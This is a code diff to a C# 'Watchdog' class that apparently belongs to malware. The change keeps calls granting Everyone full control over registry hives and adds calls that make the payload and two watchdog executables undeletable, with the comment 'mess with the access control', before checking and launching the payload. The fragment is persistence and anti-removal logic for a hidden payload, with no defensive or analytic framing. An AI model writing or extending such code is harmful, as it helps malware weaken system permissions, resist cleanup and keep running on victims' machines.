@@ -63,9 +63,13 @@ class Watchdog
 
             Persistence.Persistence.GrantEveryoneFullControl("HKLM");
             Persistence.Persistence.GrantEveryoneFullControl("HKLU");
-            Persistence.Persistence.GrantEveryoneFullControlOnDirectory(Config.SecondaryWatchdogPath);
-            Persistence.Persistence.GrantEveryoneFullControlOnDirectory(Config.PrimaryWatchdogPath);
-            Persistence.Persistence.GrantEveryoneFullControlOnDirectory(Config.PayloadPath);
+
+            // mess with the access control
+            Persistence.Persistence.makeFileUndeletable(Config.PayloadFullPath);
+            Persistence.Persistence.makeFileUndeletable(Config.SecondaryWatchdogFullPath);
+            Persistence.Persistence.makeFileUndeletable(Config.PrimaryWatchdogFullPath);
+
+
 
             watchdogHelper.watchdogHelper.verifyFilePathsSourceAndDest(Config.PayloadPath, Config.PayloadName);
             watchdogHelper.watchdogHelper.CheckAndRunPayload(Config.PayloadPath, Config.PayloadName);
